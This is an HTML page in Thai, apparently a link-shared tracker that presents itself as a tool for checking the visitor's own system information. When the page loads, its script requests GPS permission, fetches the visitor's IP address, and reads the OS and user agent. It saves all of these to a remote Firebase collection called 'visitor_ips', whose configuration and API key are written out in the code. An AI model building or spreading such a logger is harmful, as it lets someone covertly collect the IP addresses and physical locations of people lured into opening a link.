<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ข้อมูลอุปกรณ์และเครือข่ายของคุณ</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            padding: 30px; 
            background-color: #f4f7f6;
            color: #333;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            padding: 20px 30px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        h2 { text-align: center; color: #2c3e50; }
        .info-box {
            background: #e9ecef;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            line-height: 1.6;
        }
        .info-label { font-weight: bold; color: #495057; }
        #status { text-align: center; font-weight: bold; margin-top: 15px; color: blue; }
        .success { color: #28a745 !important; }
        .error { color: #dc3545 !important; }
        .warning { color: #ffc107 !important; } /* สีเหลืองสำหรับคำเตือนเรื่อง GPS */
    </style>
</head>
<body>

    <div class="container">
        <h2>ตรวจสอบข้อมูลระบบของคุณ</h2>
        
        <div class="info-box">
            <p><span class="info-label">🌐 IP Address:</span> <span id="ipDisplay">กำลังตรวจสอบ...</span></p>
            <p><span class="info-label">💻 ระบบปฏิบัติการ:</span> <span id="osDisplay">กำลังตรวจสอบ...</span></p>
            <p><span class="info-label">📱 เบราว์เซอร์:</span> <span id="deviceDisplay">กำลังตรวจสอบ...</span></p>
            <!-- เพิ่มบรรทัดสำหรับแสดงพิกัด -->
            <p><span class="info-label">📍 พิกัด (Lat, Long):</span> <span id="locationDisplay">กำลังรอการอนุญาต...</span></p>
        </div>

        <p id="status">ระบบกำลังขออนุญาตเข้าถึงตำแหน่งของคุณ...</p>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js";

        // Config ของ Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyAv7q5JRh_VnsKNqEDBl-60KruafC7fGfw",
            authDomain: "app-ip-line.firebaseapp.com",
            projectId: "app-ip-line",
            storageBucket: "app-ip-line.firebasestorage.app",
            messagingSenderId: "697728554662",
            appId: "1:697728554662:web:73b67252752e97051c4667",
            measurementId: "G-9YQ4CMNEW1"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const statusText = document.getElementById("status");

        // 1. ฟังก์ชันหา OS
        function getOS() {
            const userAgent = window.navigator.userAgent;
            let os = "ไม่ทราบระบบปฏิบัติการ";
            if (userAgent.indexOf("Win") !== -1) os = "Windows";
            if (userAgent.indexOf("Mac") !== -1) os = "MacOS";
            if (userAgent.indexOf("X11") !== -1 || userAgent.indexOf("Linux") !== -1) os = "Linux";
            if (userAgent.indexOf("Android") !== -1) os = "Android";
            if (userAgent.indexOf("like Mac") !== -1) os = "iOS (iPhone/iPad)";
            return os;
        }

        // 2. ฟังก์ชันขอพิกัด (ทำงานแบบ Promise เพื่อรอให้ผู้ใช้กดอนุญาต)
        function getLocation() {
            return new Promise((resolve, reject) => {
                // เช็คว่าเบราว์เซอร์รองรับไหม
                if (!navigator.geolocation) {
                    reject("เบราว์เซอร์นี้ไม่รองรับการระบุตำแหน่ง");
                } else {
                    // ขอพิกัด
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            // ถ้าผู้ใช้อนุญาต และหาพิกัดเจอ
                            resolve({
                                lat: position.coords.latitude,
                                long: position.coords.longitude
                            });
                        },
                        (error) => {
                            // ถ้าผู้ใช้ไม่อนุญาต หรือมีปัญหาอื่น
                            reject(`ไม่สามารถดึงตำแหน่งได้ (Error Code: ${error.code})`);
                        }
                    );
                }
            });
        }

        // 3. ฟังก์ชันหลักที่รวบรวมทุกอย่างและเซฟลง Firebase
        async function fetchInfoAndSave() {
            let lat = null;
            let long = null;
            let locationString = "ไม่สามารถระบุได้";

            try {
                // พยายามดึงพิกัดก่อน (ขั้นตอนนี้เบราว์เซอร์จะเด้งถามผู้ใช้)
                statusText.innerText = "กรุณากด 'อนุญาต' เพื่อให้ระบบตรวจสอบตำแหน่ง...";
                const coords = await getLocation();
                lat = coords.lat;
                long = coords.long;
                locationString = `${lat}, ${long}`;
                // สร้างลิงก์ Google Maps ให้กดดูได้ง่ายๆ บนหน้าเว็บ
                document.getElementById("locationDisplay").innerHTML = 
                    `<a href="https://www.google.com/maps?q=${lat},${long}" target="_blank">${locationString}</a>`;
            } catch (locationError) {
                // ถ้าดึงพิกัดไม่ได้ (เช่น ผู้ใช้กดไม่อนุญาต) ก็ทำงานต่อ ไม่ต้องแครช
                console.warn(locationError);
                document.getElementById("locationDisplay").innerText = "ผู้ใช้ไม่อนุญาต หรือเกิดข้อผิดพลาด";
            }

            statusText.innerText = "กำลังดึงข้อมูลระบบอื่นๆ และบันทึกลงฐานข้อมูล...";

            try {
                // ดึงข้อมูล IP, OS, Device
                const osInfo = getOS();
                const deviceInfo = window.navigator.userAgent;
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const userIp = data.ip;

                // แสดงผลบนหน้าเว็บ
                document.getElementById("ipDisplay").innerText = userIp;
                document.getElementById("osDisplay").innerText = osInfo;
                document.getElementById("deviceDisplay").innerText = deviceInfo;

                // บันทึกลง Firebase Database
                await addDoc(collection(db, "visitor_ips"), {
                    ip_address: userIp,
                    os: osInfo,
                    device_info: deviceInfo,
                    latitude: lat, // บันทึก Lat (ถ้าไม่ได้จะเป็น null)
                    longitude: long, // บันทึก Long (ถ้าไม่ได้จะเป็น null)
                    timestamp: new Date()
                });

                statusText.className = "success";
                statusText.innerText = "บันทึกข้อมูลระบบ (และตำแหน่ง) เรียบร้อยแล้ว!";

            } catch (error) {
                console.error("Error:", error);
                statusText.className = "error";
                statusText.innerText = "เกิดข้อผิดพลาดในการบันทึกข้อมูลหลัก";
            }
        }

        window.onload = fetchInfoAndSave;
    </script>
</body>
</html>
